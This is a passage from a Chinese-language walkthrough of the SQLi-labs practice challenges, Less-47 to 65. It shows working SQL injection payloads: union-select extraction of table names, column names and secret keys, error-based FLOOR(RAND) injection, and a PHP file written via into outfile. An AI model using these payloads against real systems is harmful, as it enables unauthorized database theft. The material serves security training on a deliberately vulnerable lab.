  admin4    admin<span class="token operator"><span class="token file-descriptor important">4</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>浏览器访问测试看看：</p><p><img src="https://image.3001.net/images/20200518/15897680165097.png" alt="img"></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里 不再过多演示了。</p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里 不再过多演示了。</p><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话 这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。</p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p><h1 id="进阶挑战-54-65-关"><a href="#进阶挑战-54-65-关" class="headerlink" title="进阶挑战 54-65 关"></a>进阶挑战 54-65 关</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>简单源码分析：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> reset<span class="token punctuation">:</span>    <span class="token comment"># 根据时间戳生成 cookie</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3600000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> cookie 中有 challenge<span class="token punctuation">:</span>        <span class="token variable">$sessid</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 生成 cookie </span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">;</span>        <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token variable">$col</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"challenge"</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        计数器 <span class="token operator">+</span> <span class="token number">1</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM security.users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> 有查询成功<span class="token punctuation">:</span>        输出查询信息    <span class="token keyword">else</span>：        啥都不输出<span class="token comment"># key 被双重过滤了</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT 1 FROM <span class="token interpolation"><span class="token variable">$table</span></span> WHERE <span class="token interpolation"><span class="token variable">$col1</span></span>= '<span class="token interpolation"><span class="token variable">$key</span></span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：</p><p><strong>判断闭合方式</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>判断字段数</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; order by 3--+?id&#x3D;1&#39; order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>查询有可注入的字段</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字段数 2,3</p><p>查询表名**</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表名为：KMA0E2Z29V ，这个表名可能是随机的 不同用户不一样</p><p><strong>查询列名</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;0x4b4d413045325a323956)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查到列名如下：id、sessid、secret_1XVB、tryy</p><p><strong>查询字段值</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_1XVB)+FROM+KMA0E2Z29V)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到 key 值为：UNK985xGrJL5PIWKGogHXo3F</p><p>总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。</p><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注</td><td align="left"><code>id=($id)</code></td></tr></tbody></table><p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化， 这里不再赘述。</p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$unames</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Dumb"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Angelina"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Dummy"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"secure"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"stupid"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"superman"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"batman"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dhakkan"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$unames</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Login name : '</span><span class="token operator">.</span> <span class="token variable">$unames</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Password : '</span> <span class="token operator">.</span><span class="token variable">$pass</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>因为这里输出只输出 <code>$unames</code> 和 <code>$pass</code> 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以这里就可以进行报错注入，下面直接丢 payload 吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(secret_OD68 )+AS+CHAR),0x7e))+FROM+WOO6ID239T+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里 注入的表名为：WOO6ID239T，列名为：secret_OD68</p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58</p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，这是一个大工程，在实战工程中还是靠 sqlmap 这种自动化注入神器了，手工注入的话岂不是得天荒地老。</p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>id=(($id))</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实际上 sqlmap 也很强大，尤其是在盲注这一块效率比手工要快很多，但是正如 某些大佬说的一样，一上来就使用工具这样只会变成最垃圾的脚本小子（script kids），所以手工注入还是系统的学习掌握一下的，手工注入在存在联合和报错注入的情况下，注入速度也是不低于 sqlmap 的哦。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/lcamry/">lcamry 大佬的《MySQL注入天书》</a></li><li><a href="https://www.anquanke.com/post/id/98096">Dnslog 在 SQL 注入中的实战</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
